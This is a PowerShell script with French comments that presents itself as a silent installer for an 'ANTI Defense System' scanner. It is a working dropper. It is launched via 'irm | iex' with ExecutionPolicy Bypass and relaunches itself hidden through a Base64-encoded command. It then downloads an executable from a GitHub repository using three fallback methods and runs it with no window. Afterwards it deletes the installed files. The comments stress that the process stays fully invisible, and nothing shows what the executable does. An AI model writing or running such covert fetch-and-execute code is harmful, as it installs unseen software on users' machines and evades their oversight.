# ANTI Defense System - Silent Installer v3.0
# ─────────────────────────────────────────────────────────────────────────────
# Commande d'appel correcte (AUCUNE fenetre visible) :
#   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1 | iex"
#
# BUG CORRIGE : La fenetre PowerShell restait visible car :
#   1. La commande appelante n'avait pas -WindowStyle Hidden
#   2. Start-Process -Wait bloquait et la console parente restait ouverte
#
# SOLUTION : Ce script se detecte dans la console visible (absence du flag),
# se re-lance immediatement en ProcessStartInfo hidden+detache, puis exit 0.
# Le parent disparait instantanement. Le processus enfant est 100% invisible.
# ─────────────────────────────────────────────────────────────────────────────

$ErrorActionPreference = "SilentlyContinue"

$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/exedownloader/main"
$installDir = "$env:LOCALAPPDATA\AntiScan"
$exePath    = "$installDir\anti-scan.exe"
$logicFlag  = "$env:TEMP\_anti_wrk"

# ─── Etape 1 : Auto-relance en processus hidden ────────────────────────────────
# Si le flag est absent, on est dans la console visible initiale.
# On se re-lance en hidden et on ferme immediatement.
if (-not (Test-Path $logicFlag)) {
    try {
        $null = New-Item -Path $logicFlag -ItemType File -Force -ErrorAction SilentlyContinue

        # Construire la commande encodee en Base64 pour eviter tout probleme de guillemets
        $cmd = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm 'https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1' | iex"
        $bytes   = [System.Text.Encoding]::Unicode.GetBytes($cmd)
        $encoded = [Convert]::ToBase64String($bytes)

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded"
        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow  = $true
        $psi.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    } catch {}

    # Fermer immediatement la console parente visible
    exit 0
}

# ─── Etape 2 : Worker (s'execute dans le processus enfant invisible) ──────────
Remove-Item -Path $logicFlag -Force -ErrorAction SilentlyContinue

# Nettoyage de l'ancienne installation
Remove-Item -Path $installDir -Recurse -Force -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Force -Path $installDir

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$downloaded = $false

# Methode 1 : WebClient (rapide, silencieuse)
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ANTI-Scanner/3.0"
    $wc.DownloadFile("$REPO_URL/anti-scan.exe", $exePath)
    if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
} catch {}

# Methode 2 : Invoke-WebRequest (fallback)
if (-not $downloaded) {
    try {
        Invoke-WebRequest -Uri "$REPO_URL/anti-scan.exe" `
                          -OutFile $exePath `
                          -UseBasicParsing `
                          -UserAgent "ANTI-Scanner/3.0" `
                          -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

# Methode 3 : BITS Transfer (fonctionne derriere proxy, tres silencieux)
if (-not $downloaded) {
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source "$REPO_URL/anti-scan.exe" `
                           -Destination $exePath `
                           -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

# Abandon si aucune methode n'a fonctionne
if (-not $downloaded) {
    Remove-Item -Path $installDir -Recurse -Force -ErrorAction SilentlyContinue
    exit 1
}

# ─── Etape 3 : Lancement silencieux (sans -Wait pour ne pas bloquer) ──────────
try {
    $psi2 = New-Object System.Diagnostics.ProcessStartInfo
    $psi2.FileName        = $exePath
    $psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi2.CreateNoWindow  = $true
    $psi2.UseShellExecute = $false
    $proc = [System.Diagnostics.Process]::Start($psi2)
    if ($proc -and -not $proc.HasExited) {
        $proc.WaitForExit(600000) | Out-Null
    }
} catch {}

# ─── Etape 4 : Nettoyage post-scan ───────────────────────────────────────────
Start-Sleep -Seconds 2
Remove-Item -Path $installDir          -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\AntiScan" -Recurse -Force -ErrorAction SilentlyContinue
